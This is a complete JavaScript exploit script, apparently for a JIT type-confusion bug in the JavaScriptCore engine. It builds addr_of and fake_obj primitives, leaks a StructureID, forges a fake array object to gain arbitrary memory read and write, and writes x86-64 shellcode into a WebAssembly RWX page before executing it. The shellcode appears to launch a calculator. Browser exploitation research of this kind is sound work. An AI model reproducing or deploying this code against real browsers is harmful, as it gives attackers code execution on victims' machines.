const MAX_ITERATIONS = 0x1000;

const buf = new ArrayBuffer(8);
const f64 = new Float64Array(buf);
const u32 = new Uint32Array(buf);
// Floating point to 64-bit unsigned integer
function f2i(val)
{ 
    f64[0] = val;
    return u32[1] * 0x100000000 + u32[0];
}
// 64-bit unsigned integer to Floating point
function i2f(val)
{
    let tmp = [];
    tmp[0] = parseInt(val % 0x100000000);
    tmp[1] = parseInt((val - tmp[0]) / 0x100000000);
    u32.set(tmp);
    return f64[0];
}

// 64-bit unsigned integer to jsValue
function i2obj(val)
{
    return i2f(val-0x02000000000000);
}

// 64-bit unsigned integer to hex
function hex(i)
{
    return "0x"+i.toString(16).padStart(16, "0");
}

function wasm_func() {
    var wasmImports = {
        env: {
            puts: function puts (index) {
                print(utf8ToString(h, index));
            }
        }
    };
    
    var buffer = new Uint8Array([0,97,115,109,1,0,0,0,1,137,128,128,128,0,2,
        96,1,127,1,127,96,0,0,2,140,128,128,128,0,1,3,101,110,118,4,112,117,
        116,115,0,0,3,130,128,128,128,0,1,1,4,132,128,128,128,0,1,112,0,0,5,
        131,128,128,128,0,1,0,1,6,129,128,128,128,0,0,7,146,128,128,128,0,2,6,
        109,101,109,111,114,121,2,0,5,104,101,108,108,111,0,1,10,141,128,128,
        128,0,1,135,128,128,128,0,0,65,16,16,0,26,11,11,146,128,128,128,0,1,0,
        65,16,11,12,72,101,108,108,111,32,87,111,114,108,100,0]);
    let m = new WebAssembly.Instance(new WebAssembly.Module(buffer),wasmImports);
    let h = new Uint8Array(m.exports.memory.buffer);
    return m.exports.hello;  
}
// wasm obj
let wasm_obj = wasm_func();

let no_cow = 13.37;
let template = [no_cow, 2.2, 3.3];
template.x = {};

let arr = [no_cow, 2.2, 3.3];

// print(describe(arr));
// addr_of and fake_obj primitive in just one jit compiled function.
function foo(arr, addr)
{
    arr[0] = addr;
    return arr[1];
}
// jit compile foo
for( let i=0; i<MAX_ITERATIONS; i++ ) {
    foo(arr, 1.1);
}
// addr_of primitive with vuln
function addr_of(obj) {
    
    
    let arr = new Array(no_cow, 2,2, 3.3);
    arr[1] = obj;

    let addr = foo(arr, 1.1);
    return f2i(addr);
}

// fake_obj primitive with vuln
function fake_obj(addr) {
    
    addr = i2f(addr);
    let arr = [{}, 2.2, 3.3];
	

    foo(arr, addr);
    return arr[0];
}
// addr_of and fake_obj primitives tests
let obj = [no_cow, 2.2, 3.3];
// print(describe(obj));
let obj_addr = addr_of(obj);
// print(hex(obj_addr));
// let fake_o = fake_obj(obj_addr);
// print(describe(fake_o));
// obj_addr = addr_of(obj);
// print(hex(obj_addr));
// fake_o = fake_obj(obj_addr);
// print(describe(fake_o));

// leak entropy by functionProtoFuncToString
function leak_structure_id(obj)
{
    // https://i.blackhat.com/eu-19/Thursday/eu-19-Wang-Thinking-Outside-The-JIT-Compiler-Understanding-And-Bypassing-StructureID-Randomization-With-Generic-And-Old-School-Methods.pdf

    var unlinked_function_executable = {
        m_isBuitinFunction: i2f(0xdeadbeef),
        pad1: 1, pad2: 2, pad3: 3, pad4: 4, pad5: 5, pad6: 6,
        m_identifier: {},
    };

    var fake_function_executable = {
      pad0: 0, pad1: 1, pad2: 2, pad3: 3, pad4: 4, pad5: 5, pad6: 6, pad7: 7, pad8: 8,
      m_executable: unlinked_function_executable,
    };

    var container = {
      jscell: i2f(0x00001a0000000000),
      butterfly: {},
      pad: 0,
      m_functionExecutable: fake_function_executable,
    };


    let fake_obj_addr = addr_of(container) + 0x10;
    let fake_o = fake_obj(fake_obj_addr);

    unlinked_function_executable.m_identifier = fake_obj;
    container.butterfly = arr_leak;

    var name_str = Function.prototype.toString.call(fake_obj);

    let structure_id = name_str.charCodeAt(9);

    // repair the fakeObj's jscell
    u32[0] = structure_id;
    u32[1] = 0x01082309-0x20000;
    container.jscell = f64[0];
    return structure_id;
}

// leak entropy by getByVal
function leak_structure_id2(obj)
{
    let container = {
        cell_header: i2obj(0x0108230700000000),
        butterfly: obj
    };

    let fake_obj_addr = addr_of(container) + 0x10;
    let fake_o = fake_obj(fake_obj_addr);
    f64[0] = fake_o[0];

    // print(123); 
    let structure_id = u32[0];
    u32[1] = 0x01082307 - 0x20000;
    container.cell_header = f64[0];

    return structure_id;
}

let pad = new Array(no_cow, 2.2, {}, 13.37);
let pad1 = new Array(no_cow, 2.2, {}, 13.37, 5.5, 6.6, 7.7, 8,8);
let pad2 = new Array(no_cow, 2.2, {}, 13.37, 5.5, 6.6, 7.7, 8,8);
var arr_leak = new Array(no_cow, 2.2, 3.3, 4.4, 5.5, 6.6, 7.7, 8.8);
// print(describe(pad));
// print(describe(arr_leak)); 
let structure_id = leak_structure_id2(arr_leak);
// let structure_id = leak_structure_id(arr_leak);
print("[+] leak structureID: "+hex(structure_id));

pad = [{}, {}, {}];
var victim = [no_cow, 14.47, 15.57];
victim['prop'] = 13.37;
victim['prop_0'] = 13.37;

u32[0] = structure_id;
u32[1] = 0x01082309-0x20000;
// container to store fake driver object
var container = {
    cell_header: f64[0],
    butterfly: victim   
};
// build fake driver
var container_addr = addr_of(container);
var fake_arr_addr = container_addr + 0x10;
print("[+] fake driver object addr: "+hex(fake_arr_addr));
var driver = fake_obj(fake_arr_addr);

// ArrayWithDouble
var unboxed = [no_cow, 13.37, 13.37];
// ArrayWithContiguous
var boxed = [{}];

// leak unboxed butterfly's addr
driver[1] = unboxed;
var shared_butterfly = victim[1];
print("[+] shared butterfly addr: " + hex(f2i(shared_butterfly)));
// now the boxed array and unboxed array share the same butterfly
driver[1] = boxed;
victim[1] = shared_butterfly;
// print(describe(boxed));
// print(describe(unboxed));


// set driver's cell header to double array
u32[0] = structure_id;
u32[1] = 0x01082307-0x20000;
container.cell_header = f64[0];

function new_addr_of(obj) {
    boxed[0] = obj;
    return f2i(unboxed[0]);
}

function new_fake_obj(addr) {
    unboxed[0] = i2f(addr);
    return boxed[0];            
}

function read64(addr) {
    driver[1] = i2f(addr+0x10);
    return new_addr_of(victim.prop);
    // return f2i(victim.prop);
}

function write64(addr, val) {
    driver[1] = i2f(addr+0x10);
    victim.prop = new_fake_obj(val);
    // victim.prop = i2f(val);
}

function byte_to_dword_array(payload)
{

    let sc = []
    let tmp = 0;
    let len = Math.ceil(payload.length/6)
    for (let i = 0; i < len; i += 1) {
        tmp = 0;
        pow = 1;
        for(let j=0; j<6; j++){
            let c = payload[i*6+j]
            if(c === undefined) {
                c = 0;
            }
            pow = j==0 ? 1 : 256 * pow;
            tmp += c * pow;
        }
        tmp += 0xc000000000000;
        sc.push(tmp);
    }
    return sc;
}

function arbitrary_write(addr, payload) 
{
    let sc = byte_to_dword_array(payload);
    for(let i=0; i<sc.length; i++) {
        write64(addr+i*6, sc[i]);
    }
}

// leak wasm obj addr
let wasm_obj_addr = new_addr_of(wasm_obj);
print("[+] wasm obj addr: " + hex(wasm_obj_addr));
// print(describe(wasm_obj))
// leak code addr
let code_addr = read64(wasm_obj_addr + 0x30);
// leak rwx addr
let rwx_addr = read64(code_addr);
print("[+] rwx addr: " + hex(rwx_addr));
var shellcode = [72, 184, 1, 1, 1, 1, 1, 1, 1, 1, 80, 72, 184, 46, 121, 98,
    96, 109, 98, 1, 1, 72, 49, 4, 36, 72, 184, 47, 117, 115, 114, 47, 98,
    105, 110, 80, 72, 137, 231, 104, 59, 49, 1, 1, 129, 52, 36, 1, 1, 1, 1,
    72, 184, 68, 73, 83, 80, 76, 65, 89, 61, 80, 49, 210, 82, 106, 8, 90,
    72, 1, 226, 82, 72, 137, 226, 72, 184, 1, 1, 1, 1, 1, 1, 1, 1, 80, 72,
    184, 121, 98, 96, 109, 98, 1, 1, 1, 72, 49, 4, 36, 49, 246, 86, 106, 8,
    94, 72, 1, 230, 86, 72, 137, 230, 106, 59, 88, 15, 5];
/*
shellcode = [72, 184, 1, 1, 1, 1, 1, 1, 1, 1, 80, 72, 184, 102, 01, 98,
    96, 109, 98, 1, 1, 72, 49, 4, 36, 72, 184, 47, 0x72, 0x65, 0x61, 0x64, 0x66,
    0x6c, 0x61, 80, 72, 137, 231, 104, 59, 49, 1, 1, 129, 52, 36, 1, 1, 1, 1,
    72, 184, 68, 73, 83, 80, 76, 65, 89, 61, 80, 49, 210, 82, 106, 8, 90,
    72, 1, 226, 82, 72, 137, 226, 72, 184, 1, 1, 1, 1, 1, 1, 1, 1, 80, 72,
    184, 121, 98, 96, 109, 98, 1, 1, 1, 72, 49, 4, 36, 49, 246, 86, 106, 8,
    94, 72, 1, 230, 86, 72, 137, 230, 106, 59, 88, 15, 5];
    */
// write shellcode to rwx mem
arbitrary_write(rwx_addr, shellcode);
// trigger shellcode to execute
wasm_obj();

